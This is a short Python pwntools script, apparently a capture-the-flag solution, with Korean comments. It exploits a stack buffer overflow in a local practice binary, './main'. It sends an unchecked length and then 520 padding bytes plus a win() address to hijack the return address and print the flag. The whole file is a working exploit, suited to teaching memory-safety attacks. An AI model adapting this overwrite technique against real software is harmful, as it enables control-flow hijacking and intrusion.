from pwn import *

p=process('./main')
#Goal
#버퍼 오버플로우를 이용해 반환 주소를 win() 함수 주소로 덮어 플래그를 출력

#Vulnerability
#입력 길이를 사용자가 마음대로 정할 수 있고, 검증을 안 해서 버퍼 오버플로우가 발생

#Exploitation
win = 0x00000000004011b6
payload=b'A'*(0x200+8)
payload+=p64(win)

p.sendline(b'528')
p.send(payload)


p.interactive()
